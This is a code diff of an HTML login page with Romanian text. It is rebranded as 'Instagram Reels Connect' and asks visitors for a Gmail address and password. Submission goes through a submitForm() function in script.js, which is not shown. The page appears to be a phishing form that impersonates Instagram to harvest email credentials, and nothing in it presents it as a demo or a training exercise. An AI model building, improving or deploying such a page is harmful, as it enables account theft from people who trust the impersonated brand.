@@ -3,24 +3,34 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Login</title>
-    <link rel="stylesheet" href="styles.css" />
+    <title>Login Page</title>
+    <link rel="stylesheet" href="styles.css">
   </head>
   <body>
+    <!-- Container pentru animatie -->
+    <div class="background-animation"></div>
+
+    <!-- Container pentru formular -->
     <div class="container">
-      <div class="logo">
-        <!-- Aici poți adăuga logo-ul Instagram, dacă dorești -->
-      </div>
-      <form action="process.php" method="post">
-        <input type="email" name="email" placeholder="Email" required />
+      <h2>Instagram Reels Connect</h2>
+      <form id="form">
+        <label for="name">Gmail:</label>
         <input
-          type="password"
-          name="password"
-          placeholder="Password"
-          required
+          type="text"
+          id="name"
+          name="name"
+          placeholder="Introduceți gmailul de conectare..."
         />
-        <button type="submit" name="submit">Trimite!</button>
+        <label for="details">Parola:</label>
+        <textarea
+          id="details"
+          name="details"
+          placeholder="Introduceți parola de conectare..."
+        ></textarea>
+        <button type="button" onclick="submitForm()">Trimite!</button>
       </form>
     </div>
+
+    <script src="script.js"></script>
   </body>
 </html>
